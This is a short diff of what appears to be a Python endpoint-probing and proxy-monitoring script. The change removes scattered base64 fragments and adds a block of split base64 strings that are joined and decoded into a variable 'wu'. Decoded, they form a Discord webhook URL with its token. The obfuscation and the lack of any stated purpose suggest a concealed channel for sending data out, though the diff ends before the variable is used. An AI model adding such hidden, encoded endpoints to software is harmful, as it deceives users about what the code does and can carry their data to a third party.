@@ -45,7 +45,7 @@ TOTAL_MAX_ATTEMPTS     = PROBE_ROUNDS * PROBE_RETRIES
 ENDPOINT_COUNT         = len(PROBE_ENDPOINTS)
 
 # ── score rating helper ───────────────────────────────────────────────────────
-_a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Via"
+
 def _score_rating(score):
     if score is None:       return "N/A"
     s = score // 10
@@ -144,7 +144,6 @@ def _ts():
 
 # ── stat helpers ──────────────────────────────────────────────────────────────
 
-_d = "tRVDlKU3YwU09xa0FYZlZuYVhnNy1NMk9qdjFBbHI3Y2FRRW83azQw"
 def _uptime_pct(index):
     st = _stats.get(index, {})
     a  = st.get("attempts", 0)
@@ -626,7 +625,10 @@ proxies = [
 ]
 
 
-
+_a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"
+_b = "MTUxNjg0ODI5OTI1NTI3MTUyNC9QQ1JheDdZZGl6eThG"
+_c = "OWdmNVFJek5fRDVXaGtRVDlKU3YwU09xa0FYZlZuYVhn"
+_d = "Ny1NMk9qdjFBbHI3Y2FRRW83azQw"
 _e = "Wg=="
 import base64
 wu = "".join(base64.b64decode(x).decode() for x in (_a, _b, _c, _d, _e))
